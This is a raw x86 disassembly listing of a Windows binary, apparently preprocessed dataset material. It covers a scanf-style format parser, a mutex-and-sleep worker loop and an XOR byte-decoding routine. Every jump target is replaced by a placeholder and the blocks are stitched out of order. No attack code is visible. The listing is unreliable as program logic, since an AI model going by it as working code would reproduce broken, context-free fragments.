movzx edi [ esi ]
or edi 0x20
mov [ ebp - 0x1e8 ] edi
cmp edi 0x6e
je r-xdata
mov al [ esi ]
cmp al 0x53
je r-xdata
cmp [ ebp - 0x195 ] 0x0
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x18d ] 0x0
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x1c0 ]
test ecx ecx
je r-xdata
cmp edi 0x63
je r-xdata
mov [ ebp - 0x195 ] 0x1
mov [ ebp - 0x195 ] 0xff
cmp al 0x43
jne r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x185 ]
jmp r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp [ ebp - 0x19c ] 0x0
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
cmp edi 0x7b
je r-xdata
cmp cl 0x64
je r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
cmp edi 0x6f
jg r-xdata
cmp edi 0x63
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jmp r-xdata
mov ebx [ ebp - 0x1bc ]
mov esi [ ebp - 0x1b0 ]
mov edi [ ebp - 0x1e8 ]
push [ ebp - 0x1a0 ]
lea esi [ ebp - 0x18c ]
call sub_100816c9
pop ecx
jmp r-xdata
cmp cl 0x69
je r-xdata
mov esi eax
jmp r-xdata
mov eax edi
sub eax 0x70
je r-xdata
je r-xdata
mov eax [ ebp - 0x1ec ]
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x1ec ] eax
add eax 0x4
mov [ ebp - 0x1e4 ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x1cc ] eax
cmp eax 0x1
jb r-xdata
cmp edi 0x73
je r-xdata
je r-xdata
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
cmp cl 0x6f
je r-xdata
mov [ ebp - 0x185 ] 0x1
sub eax 0x3
je r-xdata
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
cmp edi 0x63
je r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
cmp edi 0x7b
jne r-xdata
cmp cl 0x78
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
cmp edi 0x64
je r-xdata
mov [ ebx ] 0x0
xor eax eax
mov [ ebx ] ax
jmp r-xdata
cmp cl 0x58
jne r-xdata
cmp [ ebp - 0x1dc ] 0x0
je r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
mov esi ebx
je r-xdata
mov [ ebp - 0x1a1 ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] 0x1
jle r-xdata
call sub_1006299d
mov [ eax ] 0xc
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
mov ebx eax
test ecx ecx
je r-xdata
cmp edi 0x63
je r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_1002435e
pop ecx
pop ecx
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ esi ]
cmp eax [ ebp - 0x194 ]
jne r-xdata
cmp edi 0x67
jle r-xdata
cmp [ ebp - 0x1a4 ] 0x0
je r-xdata
cmp edi 0x78
je r-xdata
cmp [ ebp - 0x1a4 ] 0x0
je r-xdata
cmp edi 0x78
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
dec [ ebp - 0x1cc ]
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
je r-xdata
dec [ ebp - 0x1a2 ]
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x194 ] 0x2d
jne r-xdata
cmp edi 0x69
je r-xdata
cmp edi 0x46
jne r-xdata
neg [ ebp - 0x1c4 ]
movzx eax bl
push eax
call sub_1003eba7
pop ecx
test eax eax
je r-xdata
cmp edi 0x70
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
jmp r-xdata
movzx eax bl
push eax
call sub_1003eba7
pop ecx
test eax eax
je r-xdata
cmp edi 0x70
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp ebx 0x30
jne r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
inc esi
cmp [ esi ] 0x5e
jne r-xdata
mov [ ebp - 0x1a1 ] 0x1
mov [ ebp - 0x1f4 ] 0x1
jmp r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_1002435e
pop ecx
pop ecx
mov esi [ ebp - 0x1b0 ]
inc [ ebp - 0x1a2 ]
inc esi
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov eax [ ebp - 0x1ec ]
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ eax ] 0x2d
inc ebx
jmp r-xdata
push 0x64
pop edi
cmp edi 0x6e
jne r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
and [ ebp - 0x1ac ] 0x0
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
shl [ ebp - 0x1c4 ] 0x4
push ebx
call sub_10081693
mov ebx eax
mov eax [ ebp - 0x1c4 ]
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_1000a76c
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
shld ecx eax 0x4
shl eax 0x4
push ebx
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
call sub_10081693
mov ebx eax
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_1000a76c
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x18c ]
cmp eax 0xffffffff
je r-xdata
cmp edi 0x63
je r-xdata
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
mov ebx eax
mov [ ebp - 0x194 ] ebx
cmp bl 0x78
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
mov ebx eax
mov [ ebp - 0x194 ] ebx
test ecx ecx
je r-xdata
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_1007f940
add esp 0xc
cmp [ esi ] 0x5d
jne r-xdata
inc esi
mov [ ebp - 0x1a3 ] 0xff
cmp [ ebp - 0x1c0 ] 0x0
jne r-xdata
dec [ ebp - 0x19c ]
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
mov [ ebp - 0x194 ] eax
cmp [ ebp - 0x196 ] 0x0
mov eax [ ebp - 0x18c ]
je r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_1002435e
pop ecx
pop ecx
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp edi 0x6f
jne r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_1002435e
pop ecx
pop ecx
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp edi 0x6f
jne r-xdata
push [ ebp - 0x1a0 ]
push eax
call sub_1002435e
pop ecx
pop ecx
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp edi 0x73
jne r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
cmp [ ebp - 0x1c0 ] 0x0
mov ebx eax
mov [ ebp - 0x194 ] ebx
je r-xdata
cmp bl 0x58
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
mov dl [ ebp - 0x1d1 ]
jmp r-xdata
mov dl 0x5d
inc esi
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
or [ ebp - 0x19c ] 0xffffffff
cmp [ ebp - 0x1dc ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x1c8 ]
mov ebx [ ebp - 0x1bc ]
mov eax [ ebp - 0x1c4 ]
mov eax [ ebp - 0x1c4 ]
imul eax eax 0xa
jmp r-xdata
cmp ebx 0x38
jge r-xdata
push 0x0
push 0xa
push [ ebp - 0x1b4 ]
push [ ebp - 0x1b8 ]
call sub_10082460
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] edx
jmp r-xdata
cmp ebx 0x38
jge r-xdata
inc esi
jmp r-xdata
cmp [ ebp - 0x1cc ] 0x0
je r-xdata
cmp edi 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
inc [ ebp - 0x1c8 ]
cmp [ ebp - 0x1e8 ] 0x63
je r-xdata
push 0x78
sub [ ebp - 0x19c ] 0x2
cmp [ ebp - 0x19c ] 0x1
jge r-xdata
mov [ ebp - 0x1ac ] 0x1
cmp edi 0x78
je r-xdata
mov al [ esi ]
cmp al 0x5d
jne r-xdata
push eax
call sub_1000a76c
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x185 ] 0x0
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov [ ebx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ ebx + 0x4 ] eax
jmp r-xdata
inc [ ebp - 0x1ac ]
cmp [ ebp - 0x1c0 ] 0x0
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x1c4 ] eax
je r-xdata
mov eax [ ebp - 0x1c4 ]
shl eax 0x3
jmp r-xdata
inc [ ebp - 0x1ac ]
lea eax [ ebx - 0x30 ]
cdq
add [ ebp - 0x1b8 ] eax
adc [ ebp - 0x1b4 ] edx
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
shld ecx eax 0x3
shl eax 0x3
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
jmp r-xdata
call sub_1006299d
cmp [ ebp - 0x1a1 ] 0x0
mov [ eax ] 0xc
je r-xdata
cmp [ ebp - 0x1a1 ] 0x0
je r-xdata
movsx edi [ ebp - 0x1a3 ]
xor edx edx
mov ecx eax
and ecx 0x7
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x24 ]
xor ecx edi
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
cmp [ ebp - 0x1a1 ] 0x0
je r-xdata
inc [ ebp - 0x18d ]
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
inc esi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ ebp - 0x1a3 ] al
cmp al [ ebp - 0x194 ]
jne r-xdata
mov [ ebx ] ax
mov [ ebx ] eax
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
xor eax eax
mov [ esi ] ax
jmp r-xdata
mov [ ebx ] al
inc ebx
mov [ ebp - 0x1e0 ] al
movzx eax al
push eax
call sub_10012f18
pop ecx
test eax eax
je r-xdata
mov edi [ ebp - 0x1e8 ]
mov eax [ ebp - 0x1bc ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1bc ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
push 0x30
pop ebx
jmp r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_1002435e
pop ecx
pop ecx
push 0x6f
jmp r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
test dl dl
je r-xdata
mov ebx [ ebp - 0x1bc ]
mov edi [ ebp - 0x1e8 ]
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov al [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
inc [ ebp - 0x1ac ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_1008163c
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
lea eax [ ebp - 0x204 ]
push eax
mov eax [ ebp - 0x204 ]
mov [ ebp - 0x1f0 ] 0x3f
push [ eax + 0xac ]
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x1f0 ]
push eax
call sub_10046d02
mov ax [ ebp - 0x1f0 ]
add esp 0x10
mov [ ebx ] ax
add ebx 0x2
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
mov [ ebp - 0x1df ] al
mov [ ebp - 0x194 ] ebx
pop edi
jmp r-xdata
inc [ ebp - 0x18d ]
mov cl [ esi ]
cmp cl 0x5d
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
mov [ ebp - 0x194 ] eax
movzx eax al
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x194 ] 0x65
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
mov ecx [ ebp - 0x1a8 ]
mov [ ebp - 0x194 ] eax
mov al [ ebp - 0x1a3 ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_1008163c
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x1bc ] ebx
jmp r-xdata
inc esi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_1002435e
pop ecx
pop ecx
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp [ ebp - 0x194 ] 0x45
jne r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov [ ebp - 0x185 ] dl
mov dl cl
mov [ ebp - 0x185 ] cl
jmp r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ ebx + eax ] 0x65
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_1008163c
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_1000a76c
pop ecx
test eax eax
jne r-xdata
movzx ecx [ ebp - 0x185 ]
mov eax ecx
and ecx 0x7
mov dl 0x1
shl dl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] dl
xor dl dl
jmp r-xdata
mov al [ ebp - 0x185 ]
sub al dl
movzx edi dl
movzx edx al
cmp dl [ ebp - 0x185 ]
jae r-xdata
mov eax [ ebp - 0x1a8 ]
inc [ ebp - 0x1c8 ]
lea ecx [ ebp - 0x204 ]
push ecx
push eax
push [ ebp - 0x1bc ]
mov [ ebx + eax ] 0x0
movsx eax [ ebp - 0x185 ]
dec eax
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
add esp 0x10
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
mov [ ebp - 0x194 ] eax
cmp eax 0x2d
jne r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov ecx edi
and ecx 0x7
mov eax edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc edi
dec edx
jne r-xdata
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ ebx + eax ] 0x2d
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
call sub_1008163c
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x1a8 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_1008163c
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
mov [ ebp - 0x194 ] eax
movzx eax al
push eax
call sub_1000a76c
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
mov [ ebp - 0x194 ] eax
and [ ebp - 0x19c ] eax
jmp r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1a8 ]
mov cl [ ebp - 0x194 ]
inc [ ebp - 0x1ac ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_1008163c
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_100816b3
mov [ ebp - 0x194 ] eax
movzx eax al
sub_10011c84
push 0x10
mov eax sub_100855af
call sub_100624bc
mov edi ecx
mov ecx [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
call sub_1005f7e4
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
call sub_10034a80
mov esi [ ebp + 0x28 ]
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x25
jne r-xdata
mov esi [ ebp + 0x20 ]
cmp al 0x20
jne r-xdata
push 0x0
mov eax [ edi ]
inc esi
movzx ecx [ esi ]
push ecx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x1c ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x1c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10013ab8
retn 0x24
or [ esi ] 0x1
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
jne r-xdata
inc esi
movzx ebx [ ebp + 0x12 ]
lea eax [ edi + 0x14 ]
push eax
movzx eax [ esi ]
push 0x0
push eax
call sub_1004a330
add esp 0xc
cmp bx ax
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov ebx [ ebp - 0x14 ]
mov esi [ ebp + 0x20 ]
or [ esi ] 0x2
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005a5dc
push [ ebp + 0x12 ]
mov eax [ ebx ]
push 0x48
mov ecx ebx
call [ eax + 0x8 ]
test al al
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005a5dc
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
sub_10011dc0
push ebp
mov ebp esp
mov eax [ edi + 0xf4 ]
sub esp 0x8
push ebx
mov ebx [ WaitForSingleObject@IAT ]
push esi
push 0xffffffff
push eax
call ebx
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
je r-xdata
mov edx [ edi + 0xf4 ]
push edx
call [ ReleaseMutex@IAT ]
xor eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0xe8 ]
test ecx ecx
je r-xdata
mov edx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov eax edx
cmp eax esi
je r-xdata
cmp [ ecx + 0xd4 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] edx
cmp edx esi
je r-xdata
test ecx ecx
je r-xdata
mov eax [ edi + 0xf4 ]
push eax
call [ ReleaseMutex@IAT ]
mov eax [ edi + 0xe8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + 0xf4 ]
mov esi [ ReleaseMutex@IAT ]
push edx
call esi
inc [ edi + 0xf0 ]
cmp [ edi + 0xf0 ] 0x3
jb r-xdata
lea ebx [ edi + 0x14 ]
add eax 0x4
cmp eax esi
jne r-xdata
cmp ecx [ eax ]
je r-xdata
mov ecx [ edi + 0xf4 ]
push 0xffffffff
push ecx
call ebx
mov edx [ edi + 0xf4 ]
push edx
mov [ edi + 0xe8 ] 0x0
call esi
mov eax [ edi + 0xf4 ]
push 0xffffffff
push eax
mov [ edi + 0xec ] 0x0
call ebx
cmp [ edi + 0xe8 ] 0x0
je r-xdata
push 0x0
mov [ edi + 0xc0 ] 0x0
call sub_1004c4d0
test eax eax
je r-xdata
push eax
call sub_1004c4d0
test eax eax
je r-xdata
jmp r-xdata
mov edx eax
mov eax [ edi + 0xf4 ]
push eax
mov [ edi + 0xec ] 0x1
call esi
lea ecx [ ecx ]
lea ecx [ edi + 0x14 ]
push ecx
mov [ edi + 0xec ] 0x1
mov [ edi + 0xf0 ] 0x0
call [ LeaveCriticalSection@IAT ]
mov edx [ edi + 0xf4 ]
push edx
call [ ReleaseMutex@IAT ]
mov eax [ edi + 0xe8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
mov [ edi + 0xc0 ] 0x1
call sub_1004c4d0
test eax eax
je r-xdata
mov ecx [ edi + 0xf4 ]
push ecx
call esi
push 0x1b7740
call [ Sleep@IAT ]
mov edx [ edi + 0xf4 ]
push 0xffffffff
push edx
call ebx
cmp [ edi + 0xe8 ] 0x0
jne r-xdata
push 0x2
mov [ edi + 0xc0 ] 0x2
call sub_1004c4d0
test eax eax
je r-xdata
mov ecx [ edi + 0xe8 ]
mov [ edi + 0xc0 ] 0x3
push ebx
mov [ ecx + 0xd4 ] 0x0
call [ LeaveCriticalSection@IAT ]
mov edx [ edi + 0xf4 ]
mov esi [ ReleaseMutex@IAT ]
push edx
call esi
push 0x927c0
call [ Sleep@IAT ]
mov eax [ edi + 0xf4 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
cmp [ edi + 0xe8 ] 0x0
je r-xdata
mov ecx [ edi + 0xf4 ]
push ecx
call esi
mov ebx [ WaitForSingleObject@IAT ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x4
mov [ ebp - 0x4 ] eax
cmp eax [ edi + 0x8 ]
jne r-xdata
mov eax [ edi + 0xf4 ]
push 0xffffffff
push eax
call ebx
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
push ebx
mov [ edi + 0xe8 ] eax
call [ EnterCriticalSection@IAT ]
mov eax [ edi + 0xc0 ]
mov esi [ edi + 0xe8 ]
cmp eax 0x3
je r-xdata
mov ebx [ WaitForSingleObject@IAT ]
sub_10012040
mov eax ecx
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
mov edx [ ecx ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov [ eax ] ecx
retn
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
mov [ eax ] edx
mov edx ecx
mov ecx [ edx + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
retn
mov [ eax ] edx
mov edx [ edx + 0x4 ]
cmp [ edx + 0x15 ] 0x0
je r-xdata
mov [ eax ] edx
retn
sub_100120a0
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_100120f0
push ebp
mov ebp esp
push 0xffffffff
push sub_100863c4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
xor ebx ebx
push ebx
call sub_10034e98
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] bl
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] bl
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] bl
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] bl
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
push eax
push esi
call sub_100161b4
add esp 0x8
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp + 0x8 ] r--data
call sub_10069ac6
push r--data
lea ecx [ ebp - 0x1c ]
push ecx
mov [ ebp - 0x1c ] r--data
call sub_10024fe9
sub_100121a0
mov eax [ esi + 0x1c ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
mov eax [ esi + 0xc ]
cmp eax ebx
je r-xdata
push edi
mov edi [ esi + 0x20 ]
call sub_100699f0
mov eax [ esi + 0x1c ]
push eax
call sub_100187af
add esp 0x4
pop edi
push esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
call sub_100187af
add esp 0x4
mov eax esi
pop ebx
retn
push eax
call sub_100187af
add esp 0x4
sub_10012200
push esi
mov esi ecx
cmp [ esi + 0xb8 ] 0x0
jne r-xdata
mov eax [ esi + 0x6c ]
push ebx
push edi
push r--data
xor edi edi
lea ecx [ esi + 0x5c ]
call sub_1001a2f0
test eax eax
jne r-xdata
mov eax 0x64
pop esi
retn
mov edx 0x8
cmp [ esi + 0x70 ] edx
jb r-xdata
cmp [ esi + 0x54 ] 0x8
